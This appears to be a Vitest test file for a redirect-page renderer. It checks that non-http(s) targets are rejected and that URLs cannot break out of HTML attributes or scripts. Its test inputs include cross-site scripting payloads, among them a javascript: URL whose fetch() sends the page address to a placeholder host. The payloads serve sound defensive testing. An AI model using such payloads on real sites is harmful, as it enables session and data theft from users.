import { describe, it, expect } from 'vitest';
import { isHttpUrl, renderRedirectPage } from '../redirect-page';

describe('renderRedirectPage', () => {
  it('refuses non-http(s) targets', () => {
    for (const target of [
      "javascript://localhost/%0Afetch('https://x/'+location.href)//",
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'not a url',
    ]) {
      expect(renderRedirectPage(target, 't', 'm'), target).toBeNull();
    }
  });

  it('cannot be broken out of the attribute or the script by the target URL', () => {
    const target = 'https://app.example/cb?code=1&x="</script><script>alert(1)</script>';
    const html = renderRedirectPage(target, 't', 'm')!;

    expect(html).not.toContain('<script>alert(1)');
    expect(html).not.toContain('"</script>');
    expect(html.match(/<script>/g)).toHaveLength(1);
    // The navigation target survives intact once decoded by the browser.
    const literal = html.match(/window\.top\.location\.href = (".*?");/)![1];
    expect(JSON.parse(literal)).toBe(target);
    expect(html).toContain('content="3;url=https://app.example/cb?code=1&#38;x=&#34;&#60;/script&#62;');
  });

  it('accepts https and http URLs', () => {
    expect(isHttpUrl('https://accounts.google.com/o/oauth2/v2/auth?x=1')).toBe(true);
    expect(isHttpUrl('http://localhost:5555/cb?code=a')).toBe(true);
  });
});
